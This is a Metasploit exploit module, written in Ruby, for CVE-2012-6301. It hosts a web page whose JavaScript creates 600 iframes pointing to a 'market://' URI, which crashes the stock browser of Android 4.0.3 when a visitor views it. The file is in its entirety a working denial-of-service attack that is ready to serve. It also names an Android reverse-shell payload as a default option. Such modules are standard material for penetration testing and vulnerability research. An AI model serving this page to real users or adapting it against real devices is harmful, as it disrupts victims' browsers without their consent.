##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Android Stock Browser Iframe DOS",
      'Description'    => %q{
        This module exploits a vulnerability in the native browser that comes with Android 4.0.3.
        If successful, the browser will crash after viewing the webpage.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'Jean Pascal Pereira',  # Original exploit discovery
        'Jonathan Waggoner'     # Metasploit module
      ],
      'References' => [
        [ 'URL', 'http://packetstormsecurity.com/files/118539/Android-4.0.3-Browser-Crash.html'],
        [ 'CVE', '2012-6301' ]
      ],
      'Platform'            => 'android',
      'Arch'                => ARCH_DALVIK,
      'DefaultOptions'      => { 'PAYLOAD' => 'android/shell/reverse_http' },
      'Targets'             => [ [ 'Automatic', {} ] ],
      'DisclosureDate'      => "Dec 1 2012",
      'DefaultTarget'       => 0
      ))
  end

  def on_request_uri(cli, request)
    html = %Q|
    <html>
    <body>
    <script type="text/javascript">

    var m_frame = "";

    for(var i = 0; i < 600; i++)
    {

     m_frame = document.createElement("iframe");
     m_frame.setAttribute("src", "market://a");

     document.body.appendChild(m_frame);
    }
    </script>
    </body>
    </html>
    |

    print_status(msg = 'Getting ready to send HTML to client')
    send_response(cli, html)
    print_status(msg = 'Sent HTML to client')

  end

end
